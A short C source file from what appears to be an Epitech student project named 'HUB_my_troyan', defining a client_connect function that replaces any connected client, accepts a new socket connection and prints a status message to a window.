/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 30/04/2021 client_connect.c
*/

#include "troyan_server.h"

int client_connect(server_t *server, window_t *win)
{
    if (server->client_connected == true) {
        client_disconnect(server, win);
    }
    if (socket_server_connect(&server->client, server->sock.fd))
        return EXIT_FAILURE;
    server->client_connected = true;
    gui_print(win, CLIENT_CONNECT);
    return EXIT_SUCCESS;
}